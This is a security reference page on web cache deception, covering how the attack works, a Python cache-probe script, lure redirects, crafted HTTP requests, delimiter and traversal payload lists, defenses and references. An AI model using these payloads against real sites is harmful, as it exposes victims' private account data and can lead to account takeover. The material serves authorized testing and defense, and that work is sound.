# Web Cache Deception

> Tricking a cache into storing a victim's private response under a cacheable URL. **Deep dive:** [`Troubleshooting_Guide/web_cache_deception.md`](../../../../Troubleshooting_Guide/web_cache_deception.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A05:2021 Misconfiguration
**Status:** complete

## What it is
Web cache deception tricks a cache into storing a victim's private, authenticated response and
serving it to anyone who requests the same URL. The attacker crafts a URL that the origin treats
as the victim's account page but the cache treats as a cacheable static resource.

## How it works
It exploits a discrepancy between how the cache and the origin interpret a URL. The attacker
appends something like `/my-account/wcd.js` or `/my-account;x.css`: the origin maps it back to the
sensitive `/my-account` handler and returns private data, while the cache — keying on the `.js`/
`.css` suffix or a delimiter it doesn't recognize — decides the response is static and stores it.
A victim is lured to that URL; their private response is cached, and the attacker then fetches the
same path unauthenticated to read it.

## Impact
The attacker reads whatever appears in the victim's authenticated response: personal data, account
details, API keys, CSRF tokens, and sometimes session identifiers — which can lead to full account
takeover. Severity is typically high, scaling with how sensitive the cached page is and how many
victims can be lured.

## How to detect
- Confirm a cache is present via response headers (`X-Cache: hit/miss`, `Age`, `CF-Cache-Status`,
  `X-Served-By`) and verify a path goes miss → hit on a repeat request.
- Probe a sensitive endpoint with appended extensions and delimiters (`/my-account/x.js`,
  `/my-account;x.js`, `/my-account?x.js`) and check whether the origin still returns the private
  page (200) while the response becomes cacheable.
- Look for a path that returns the same authenticated content but acquires a cache HIT on replay.

## Exploitation (summary)
Find a path-interpretation gap — extension append, delimiter (`;`, `?`, `#`), or normalization/
traversal — that makes the origin serve private data under a URL the cache deems static. Visit it
while authenticated (or lure the victim there), confirm the cache stores it, then request the same
URL with no session to retrieve the cached private response. Full delimiter lists and payloads are
in the Payloads section.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Attack pattern
1. Craft a URL that resolves to private data on the origin but looks static (cacheable) to the cache.
2. Lure the authenticated victim to that URL.
3. The cache stores the victim's private response.
4. Retrieve the same URL with no auth to read the cached data.

### Confirm a cache is in play
Look for cache-status headers, then verify a path goes miss → hit on repeat.

```http
X-Cache: hit
X-Cache-Lookup: HIT
Age: 123
CF-Cache-Status: HIT
X-Served-By: cache-xxx.example.com
X-CDN: Cloudflare
```

```python
import requests, time

TARGET = "https://target.com"
session = requests.Session()
session.cookies.set('session', 'your_session_token')

for path in ['/my-account', '/my-account/test.js', '/my-account;test.js',
             '/my-account?test.js', '/resources/..%2fmy-account']:
    c1 = session.get(f"{TARGET}{path}").headers.get('X-Cache', 'none')
    time.sleep(1)
    c2 = session.get(f"{TARGET}{path}").headers.get('X-Cache', 'none')
    print(f"{path}: first={c1}, second={c2}")
    if c1 == 'miss' and c2 == 'hit':
        print(f"  [+] VULNERABLE: {path}")
```

### Path-mapping discrepancy
Origin abstracts `/my-account/<anything>` back to `/my-account`; the cache sees the `.js` suffix and caches.

```html
<script>document.location="https://vulnerable-site.com/my-account/wcd.js"</script>
```

```http
GET /my-account/wcd.js HTTP/1.1
Host: vulnerable-site.com
```

### Path-delimiter discrepancy
Origin treats a character (`;`, `?`, `#`) as a delimiter and truncates to `/my-account`; the cache does not, so it caches the full `.js` path.

```http
GET /my-account;test HTTP/1.1   # 200 → ';' is an origin delimiter
GET /my-account?test HTTP/1.1   # 200 → '?' is an origin delimiter
```

```html
<script>document.location="https://vulnerable-site.com/my-account;wcd.js"</script>
```

```http
GET /my-account;wcd.js HTTP/1.1
Host: vulnerable-site.com
```

### Origin-side normalization
Origin decodes `%2f` and resolves `../`, mapping back to `/my-account`; the cache matches the literal `/resources/` rule and caches.

```http
GET /aaa/..%2fmy-account HTTP/1.1   # 200 → origin normalizes
```

```html
<script>document.location="https://vulnerable-site.com/resources/..%2fmy-account?wcd"</script>
```

### Cache-side normalization
Origin uses `#` as a delimiter (→ `/my-account`); the cache decodes `%23`/`%2e` and resolves to a cacheable path.

```http
GET /my-account#test HTTP/1.1     # 200 → '#' is a delimiter
GET /my-account%23test HTTP/1.1   # same behavior encoded
```

```html
<script>document.location="https://vulnerable-site.com/my-account%23%2f%2e%2e%2fresources?wcd"</script>
```

For caches with exact-match rules, normalize onto a known cached file such as `/robots.txt`:

```http
GET /my-account;%2f%2e%2e%2frobots.txt HTTP/1.1
```

### Delimiter test list
Probe each candidate against the target endpoint, recording 200 (delimiter) vs 404.

```text
;   ?   #   %23   %3f   %3b   %2f   %2e%2e%2f
```

### Static-extension variants
Caches most often key on these suffixes; append one after the path or delimiter (`/my-account/x.js`, `/my-account;x.js`).

```text
.js  .css  .png  .jpg  .jpeg  .gif  .ico  .svg  .json  .xml  .webp
```

### Path-traversal variants
```text
/resources/..%2fmy-account
/resources/..%2f/user-data
/aaa/..%2fmy-account
/%2e%2e%2fmy-account
/my-account%2f..%2fresources
```

### Bypass technique selection
| Technique | Payload example | Idea |
|-----------|-----------------|------|
| Extension append | `/my-account/test.js` | append a static extension |
| Semicolon delimiter | `/my-account;test.js` | origin truncates at `;` |
| Question mark | `/my-account?test.js` | origin truncates at `?` |
| Hash fragment | `/my-account#test.js` | origin truncates at `#` |
| Path traversal | `/resources/..%2fmy-account` | traverse out of a cached prefix |
| Double encoding | `/my-account%252ftest` | defeat single-decode filters |
| Unicode slash | `/my-account/／test.js` | fullwidth slash (U+FF0F) |
| Null byte | `/my-account%00test.js` | some parsers stop at null |
| Backslash | `/my-account\test.js` | Windows path separator |

## Defenses
1. Cache based on the origin's actual `Content-Type` and explicit `Cache-Control` headers, not on
   the URL suffix — never assume a `.js`/`.css` path is static.
2. Have the origin send `Cache-Control: no-store` (or `private`) on all authenticated/dynamic
   responses so the cache cannot store them.
3. Make the cache and origin normalize URLs identically (same handling of delimiters, encoding,
   and traversal) to eliminate the interpretation gap.
4. Cache only an explicit allow-list of paths/extensions known to be static, and verify the
   response is truly static before storing it.
5. Disable caching of any response that varies by session or carries `Set-Cookie`.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Web+Cache+Deception
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Web+Cache+Deception
- **Exploit-DB** — https://www.exploit-db.com/search?q=Web+Cache+Deception
- **GitHub Advisories** — https://github.com/advisories?query=Web+Cache+Deception
- **OSV** — https://osv.dev/list?q=Web+Cache+Deception
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Web Cache Deception <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- _Canonical incident: Omer Gil's 2017 research demonstrated caching of authenticated PayPal
  account pages — the original, defining web cache deception case._
- _ChatGPT (OpenAI) web cache deception was reported in 2024, exposing user chat data via
  cacheable paths — a widely covered modern real-world example._
- _Many instances are reported per-product via bug bounties rather than CVE IDs; search NVD/
  GitHub Advisories with the target product name plus "cache deception" before relying on a CVE._

## References
- PortSwigger Web Security Academy — Web cache deception: https://portswigger.net/web-security/web-cache-deception
- OWASP — Web Cache Deception (community attack page): https://owasp.org/www-community/attacks/Web_Cache_Deception
- RFC 9111 — HTTP Caching (which responses are cacheable and how cache keys are formed).
